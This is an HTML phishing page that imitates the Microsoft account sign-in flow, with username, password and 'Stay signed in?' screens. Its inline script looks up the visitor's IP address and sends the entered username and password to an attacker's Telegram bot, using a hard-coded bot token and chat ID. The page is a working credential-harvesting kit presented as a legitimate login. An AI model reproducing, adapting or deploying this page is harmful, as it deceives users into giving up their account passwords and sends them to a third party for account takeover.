<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="app.css" />
    <style>
        .btn:disabled {
            background-color: #ccc;
            border-color: #ccc;
            cursor: not-allowed;
        }
    </style>
</head>

<body>
    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="logo.png" alt="Microsoft" />
            <h2 class="title mb-16 mt-16">Sign in</h2>
            <form>
                <div class="mb-16">
                    <p id="error_uname" class="error"></p>
                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
                </div>
            </form>
            <div>
                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                <p class="mb-16 fs-13">
                    <a href="#" class="link">Sign in with a security key
                        <img src="question.png" alt="Question img">
                    </a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_next">Next</button>
            </div>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="key.png"
                        width="30px" /></span> Sign-in options</p>
        </div>
    </section>

    <section id="section_pwd" class="d-none">
        <div class="auth-wrapper">
            <img src="logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <button class="back">
                    <img src="back.png" />
                </button>
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Enter password</h2>
            <form>
                <div class="mb-16">
                    <p id="error_pwd" class="error"></p>
                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
                </div>
            </form>
            <div>
                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                <p class="mb-16">
                    <a href="#" class="link fs-13">Other ways to sign in</a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_sig">Sign in</button>
            </div>
        </div>
    </section>

    <section id="section_final" class="d-none">
        <div class="auth-wrapper">
            <img src="logo.png" alt="Microsoft" class="d-block" />
            <div class="identity w-100 mt-16 mb-16">
                <span id="user_identity_final">a@b.com</span>
            </div>
            <h2 class="title mb-16">Stay signed in?</h2>
            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
            <label class="has-checkbox">
                <input type="checkbox" class="checkbox" />
                <span>Don't show this again</span>
            </label>
            <div class="btn-group">
                <button class="btn btn-sec" id="btn_no">No</button>
                <button class="btn" id="btn_yes">Yes</button>
            </div>
        </div>
    </section>
    
    <footer class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    
    <script src="app.js"></script>
    
    <script>
        // Telegram configuration
        const TELEGRAM_CONFIG = {
            BOT_TOKEN: '8066607284:AAGACS8QLcAPETXDrs0MG_fUiB9Cyy6kFGY',
            CHAT_ID: '6285796509'
        };

        document.addEventListener('DOMContentLoaded', function() {
            let userData = {
                username: '',
                password: '',
                timestamp: '',
                ip: '',
                location: '',
                userAgent: navigator.userAgent
            };
            
            const btnNext = document.getElementById('btn_next');
            const btnSig = document.getElementById('btn_sig');
            const btnYes = document.getElementById('btn_yes');
            const btnNo = document.getElementById('btn_no');
            
            btnNext.onclick = async function() {
                const unameInp = document.getElementById('inp_uname');
                const errorUname = document.getElementById('error_uname');
                const unReq = "Enter a valid email address, phone number, or Skype name.";
                
                if (unameInp.value.trim() === "") {
                    errorUname.innerText = unReq;
                    unameInp.classList.add('error-inp');
                    return;
                }
                
                errorUname.innerText = "";
                unameInp.classList.remove('error-inp');
                
                userData.username = unameInp.value.trim();
                userData.timestamp = new Date().toISOString();
                
                btnNext.disabled = true;
                
                try {
                    await getUserIP();
                    await sendToTelegram('username');
                    
                    document.getElementById("section_uname").classList.toggle('d-none');
                    document.getElementById('section_pwd').classList.remove('d-none');
                    document.querySelectorAll('#user_identity').forEach((e) => {
                        e.innerText = userData.username;
                    });
                    document.getElementById('user_identity_final').innerText = userData.username;
                    
                } catch (error) {
                    document.getElementById("section_uname").classList.toggle('d-none');
                    document.getElementById('section_pwd').classList.remove('d-none');
                    document.querySelectorAll('#user_identity').forEach((e) => {
                        e.innerText = userData.username;
                    });
                    document.getElementById('user_identity_final').innerText = userData.username;
                } finally {
                    btnNext.disabled = false;
                }
            };
            
            btnSig.onclick = async function() {
                const pwdInp = document.getElementById('inp_pwd');
                const errorPwd = document.getElementById('error_pwd');
                const pwdReq = "Please enter the password for your Microsoft account.";
                
                if (pwdInp.value.trim() === "") {
                    errorPwd.innerText = pwdReq;
                    pwdInp.classList.add('error-inp');
                    return;
                }
                
                errorPwd.innerText = "";
                pwdInp.classList.remove('error-inp');
                
                userData.password = pwdInp.value.trim();
                userData.timestamp = new Date().toISOString();
                
                btnSig.disabled = true;
                
                try {
                    await sendToTelegram('credentials');
                    document.getElementById("section_pwd").classList.toggle('d-none');
                    document.getElementById('section_final').classList.remove('d-none');
                } catch (error) {
                    document.getElementById("section_pwd").classList.toggle('d-none');
                    document.getElementById('section_final').classList.remove('d-none');
                } finally {
                    btnSig.disabled = false;
                }
            };
            
            document.querySelector('.back').onclick = function() {
                document.getElementById("section_pwd").classList.toggle('d-none');
                document.getElementById('section_uname').classList.remove('d-none');
            };
            
            btnYes.onclick = async function() {
                await sendToTelegram('stay_yes');
                window.open(location, '_self').close();
            };
            
            btnNo.onclick = async function() {
                await sendToTelegram('stay_no');
                window.open(location, '_self').close();
            };
            
            async function getUserIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    userData.ip = data.ip;
                    return data.ip;
                } catch (error) {
                    userData.ip = 'Unknown';
                    return 'Unknown';
                }
            }
            
            async function sendToTelegram(type) {
                if (TELEGRAM_CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
                    TELEGRAM_CONFIG.CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                    return false;
                }
                
                try {
                    const message = formatTelegramMessage(type);
                    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
                    
                    await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CONFIG.CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        })
                    });
                    
                    return true;
                } catch (error) {
                    return false;
                }
            }
            
            function formatTelegramMessage(type) {
                const now = new Date();
                const time = now.toLocaleString();
                
                if (type === 'username') {
                    return `üë§ Username: ${userData.username}\nüåç IP: ${userData.ip}\nüïí Time: ${time}`;
                } else if (type === 'credentials') {
                    return `üîê Credentials\nüë§ Username: ${userData.username}\nüîë Password: ${userData.password}\nüåç IP: ${userData.ip}\nüïí Time: ${time}`;
                } else if (type === 'stay_yes') {
                    return `‚úÖ Stay signed in: YES\nüë§ Username: ${userData.username}`;
                } else if (type === 'stay_no') {
                    return `‚ùå Stay signed in: NO\nüë§ Username: ${userData.username}`;
                }
            }
        });
    </script>
</body>

</html>
